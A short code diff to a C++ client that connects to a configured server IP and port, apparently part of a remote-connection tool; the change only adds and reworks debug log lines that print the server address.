@@ -330,6 +330,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
     CONNECT_ADDRESS& settings(*(app.g_Connection));
     if (app.IsThreadRun()) {
         settings.SetServer(szServerIP, uPort);
+        Mprintf("TestRun SetServer[%s:%d]\n", szServerIP ? szServerIP : "", uPort);
         return;
     }
     app.SetThreadRun(TRUE);
@@ -496,13 +497,13 @@ void ParseAuthServer(CONNECT_ADDRESS *conn) {
 
 DWORD WINAPI StartClient(LPVOID lParam)
 {
-    Mprintf("StartClient begin\n");
     ClientApp& app(*(ClientApp*)lParam);
     CONNECT_ADDRESS& settings(*(app.g_Connection));
     BOOL assigned = FALSE;
     double valid_to = 0;
     std::string ip = settings.ServerIP();
     int port = settings.ServerPort();
+    Mprintf("StartClient begin[%s:%d]\n", ip.c_str(), port);
     if (!app.m_bShared) {
         iniFile cfg(CLIENT_PATH);
         auto now = time(0);
